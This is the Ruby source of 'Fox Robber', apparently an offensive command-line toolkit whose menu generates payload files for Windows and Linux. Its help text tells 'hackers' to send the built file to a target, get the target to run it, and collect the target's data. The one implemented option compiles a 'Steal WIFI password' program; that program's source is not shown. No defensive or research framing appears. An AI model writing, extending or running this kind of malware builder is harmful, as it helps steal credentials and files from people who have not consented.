$error = 'This command is not true'
module All
  class Explain
    def explain
      system('clear')
      puts "** Hi Hackers.
      Welcome to the Fox robber. The Fox robber can make some file to steal a lot of data and save it.\n**********************************************************************************************************\n** How to use it?\n(1). First, you have to make a Fox robber file, Enter number 1 to make a a Fox robber file; Then you have to see a lot of option to make your own Fox robber file.\n(2). Send the file for your target.\n(3). Run the file.\n(4). The END. you copied your target data and you can see your targets files in your PC.\n[0]. back\nWrite \"exit\" to exit in first page."
    end
  end

  class Help
    def help
      system('clear')
      puts "** First enter 1 or fox-robber to make robber file.\n** Then you see a lot of option to make robber file.\n** It too fucking easy.\n[0]. back"
    end
  end
end
system('clear')
system('chafa images.png')
system("echo \t\"FOX ROBBER\" | lolcat -a -d 30")
while true
  system('clear')
  puts "\tFOX ROBBER\n"
  puts "Tools:\n[0]. Back\n[1]. Fox robber\n[2]. Help\n[3]. Explain"
  job = 'nil'
  print "(#{job})>"
  command = gets.chomp
  case command
  when '1', 'fox-robber'
    system('clear')
    puts "Enter target OS:\n[4]. Windows\n[5]. Linux" # \n[6]. Mac\n[7]. Android\n[8]. IOS\n[0]. Back"
    job = 'fox-robber'
    while true
      job = 'fox-robber'
      print "(#{job})>"
      command_fox_robber = gets.chomp
      if %w[4 windows].include?(command_fox_robber)
        while true
          if %w[0 back].include?(command_fox_robber)
            system('clear')
            break
          else
            case command_fox_robber
            when '4', 'windows'
              system('clear')
              puts "What do you want:\n[9]. Steal WIFI password\n[0]. Back"
              job = 'fox-robber [windows]'
              print "(#{job})>"
              command_windows = gets.chomp
              case command_windows
              when '9', 'steal-wifi-password'
                puts 'Loading...'
                system('g++ Windows/Windows_Steal\ WIFI\ password.cpp')
                system('mv a.out Windows_Steal_WIFI_password')
                system('chmod -r+x Windows_Steal_WIFI_password')
                system('mv Windows_Steal_WIFI_password Out/')
                puts 'File made by Fox Robber 🦊'
                system("echo \"\t<Press enter>\" | lolcat -a")
                gets.chomp
                break
              when '0', 'back'
                break
              end
            end
          end
        end
        break
      elsif %w[5 linux].include?(command_fox_robber)
        while true
          if %w[0 back].include?(command_fox_robber)
            system('clear')
            break
          else
            system('clear')
            puts "What do you want:\n[9]. Steal WIFI password\n[0]. Back"
            job = 'fox-robber [linux]'
            print "(#{job})>"
            command_linux = gets.chomp
            case command_linux
            when '9', 'steal-wifi-password'
              puts 'Loading...'
              system('crystal build Linux/Linux_Steal\ WIFI\ password.cr')
              system('chmod -r+x Linux_Steal_WIFI_password')
              system('mv Linux_Steal\ WIFI\ password Out/')
              puts 'File made by Fox Robber 🦊'
              system("echo \"\t<Press enter>\" | lolcat -a")
              gets.chomp
              break
            when '0', 'back'
              break
            end
          end
        end
        break
      elsif %w[0 back].include?(command_fox_robber)
        system('clear')
        break
      else
        puts $error
        system('sleep 1')
      end
    end
  when '2', 'help'
    helper = All::Help.new
    helper.help
    while true
      job = 'help'
      print "(#{job})>"
      command_help = gets.chomp
      if %w[0 back].include?(command_help)
        system('clear')
        break
      else
        puts $error
        system('sleep 1')
      end
    end
  when '3', 'explain'
    describe = All::Explain.new
    describe.explain
    while true
      job = 'explain'
      print "(#{job})>"
      command_explain = gets.chomp
      if %w[0 back].include?(command_explain)
        system('clear')
        break
      else
        puts $error
        system('sleep 1')
      end
    end
  when '0', 'back'
    next
  when 'exit'
    system('clear')
    system('chafa images.png')
    system("echo \t\"FOX ROBBER\" | lolcat -a -d 30")
    system('clear')
    exit
  else
    puts $error
    system('sleep 1')
    print "(#{job} [linux])>"
  end
end
